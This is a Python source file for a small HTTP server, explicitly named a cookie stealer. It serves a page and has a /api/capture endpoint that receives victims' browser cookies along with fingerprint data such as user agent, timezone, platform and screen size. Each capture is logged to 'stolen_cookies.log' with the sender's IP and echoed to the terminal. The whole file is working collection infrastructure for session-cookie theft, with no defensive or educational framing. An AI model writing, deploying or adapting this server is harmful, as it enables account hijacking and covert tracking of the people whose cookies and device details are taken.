import http.server
import socketserver
import json
import os
import time
import urllib.parse

LOG_FILE = "stolen_cookies.log"
PORT = 8080

class CookieStealerHandler(http.server.SimpleHTTPRequestHandler):
    def log_message(self, format, *args):
        pass # Suppress default stderr logging

    def do_POST(self):
        if self.path == '/api/capture':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            
            try:
                data = json.loads(post_data.decode('utf-8'))
            except json.JSONDecodeError:
                self.send_response(400)
                self.end_headers()
                return

            timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime())
            ua = data.get('fingerprint', {}).get('userAgent', 'Unknown')
            ip = self.client_address[0]
            cookies_raw = data.get('cookies', '')
            timezone = data.get('fingerprint', {}).get('timezone', 'Unknown')
            
            # Decode cookies for readability
            try:
                cookies_decoded = urllib.parse.unquote(cookies_raw)
            except:
                cookies_decoded = cookies_raw

            # Save to file
            with open(LOG_FILE, 'a') as f:
                f.write(f"--- NEW CAPTURE: {timestamp} ---\n")
                f.write(f"IP: {ip}\n")
                f.write(f"Timezone: {timezone}\n")
                f.write(f"User-Agent: {ua}\n")
                f.write(f"Platform: {data.get('fingerprint', {}).get('platform', 'Unknown')}\n")
                f.write(f"Resolution: {data.get('fingerprint', {}).get('screenWidth', '?')}x{data.get('fingerprint', {}).get('screenHeight', '?')}\n")
                f.write(f"Is Mobile: {data.get('fingerprint', {}).get('isMobile', 'Unknown')}\n")
                f.write(f"COOKIES (DECODED):\n{cookies_decoded}\n")
                f.write(f"{'='*50}\n\n")

            # Print to terminal
            print(f"\n[{timestamp}] CAPTURED FROM {ip} (TZ: {timezone})")
            print(f"UA: {ua}")
            print(f"COOKIES: {cookies_decoded[:150]}...") 
            print("-" * 30)

            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({"success": True}).encode())
        else:
            self.send_response(404)
            self.end_headers()

    def do_GET(self):
        if self.path == '/' or self.path == '':
            self.path = '/index.html'
        super().do_GET()

def main():
    os.chdir(os.path.dirname(os.path.abspath(__file__)))
    if not os.path.exists(LOG_FILE):
        open(LOG_FILE, 'w').close()

    with socketserver.TCPServer(("", PORT), CookieStealerHandler) as httpd:
        print(f"[*] Server running on port {PORT}")
        print(f"[*] Monitoring log file: {os.path.abspath(LOG_FILE)}")
        print("[*] Press Ctrl+C to stop.")
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\n[*] Server stopped.")

if __name__ == "__main__":
    main()
